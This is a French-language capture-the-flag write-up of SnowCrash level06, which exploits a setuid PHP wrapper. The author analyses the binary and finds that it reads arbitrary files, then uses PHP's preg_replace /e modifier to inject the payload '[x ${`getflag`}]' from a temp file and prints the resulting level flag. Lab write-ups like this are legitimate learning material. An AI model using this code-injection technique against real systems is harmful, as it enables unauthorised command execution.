## Level06

On voit dans le home qu’on a accès à un binaire et un fichier php qui appartiennent tous deux à level06.

Quand on tente de lancer le binaire, on a un message d’erreur php nous disant que le filename ne peut pas être vide. Donc j’ai essayé **./level06 /etc/passwd** pour voir et le fichier s’est affiché. Il est donc possible que ce binaire permette de lire des fichiers dont on a pas les droits.

J’ai voulu afficher le /etc/shadow avec la même technique mais échec.

En regardant le code php on voit une fonction x, a qui on passe argv[1] et argv[2] en params. argv1 semble être le filename et argv2 je ne sais pas

Je peux passer plusieurs fichiers au programme il les affiche tous

Il y a des chances pour que le code php qu’on à soit celui qui ait servi a faire le binaire.

Je récupère donc le binaire sur ma machine avec **scp -P 4242 [level06@172.20.10.2](mailto:level06@172.20.10.2):/home/user/level06/level06 .**

Je le passe dans cutter et je vois que le binaire effectue un execve avec /usr/bin/php pour lancer level06.php :

![Untitled](./screenshots/Untitled%207.png)

si on fait un ls -la | grep php dans /usr/bin, on remarque aue php est lié symboliquement à /etc/alternatives/php.

La piste du lien symbolique est foireuse, en analysant le code php on remarque des preg_replace qui correspondent au traitement par regex en php.

Je joue donc avec les regex sur reg 101 pour comprendre ce qu’elles font :

**/(\[x (.*)\])/e** match **[x**NIMPORTQUELSCHARS**]**

On a aussi deux autres regex dans la fonction x qui remplacent [ et ] par ( et )

Il faut respecter la regex **/(\[x (.*)\])/e** pour que ce qu’on écrit soit lancé dans la fonction y qui est exécutée.

donc ce qu’on met [x ICI] passe dans y

J’essaye de mettre **[x exec(/bin/getflag)]** dans mon ficheir mais ca print juste exec(/bin/getflag)

Je fais mes tests sur le php playground avec

```bash
<?php
    function y($m) { 
        $m = preg_replace("/\./", " x ", $m);
        $m = preg_replace("/@/", " y", $m); 
        print $m;
        return $m; 
    }
    function x($y, $z) { 
        // $a = file_get_contents($y); 
        $a = $y;
        $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); 
        $a = preg_replace("/\[/", "(", $a); 
        $a = preg_replace("/\]/", ")", $a); 
        return $a; 
    }
    $r = x("[x exec(/bin/getflag)]", "[getflag]"); 
    //print $r;
?>
```

Et je modifie le x exec /bin/flag en avant dernière ligne pour voir ce qui est print

Avec la syntaxe d’exec php avec ${} et les backticks on met ca dans le fichier :

**[x ${\`getflag\`}]**

donc on termine avec ces commandes:
```sh
level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/test
level06@SnowCrash:~$ ./level06 /tmp/test
```


Ensuite on lanc level06 avec notre fichier en arg et on a le flag **wiok45aaoguiboiki2tuin6ub** pour se connecter au level07 
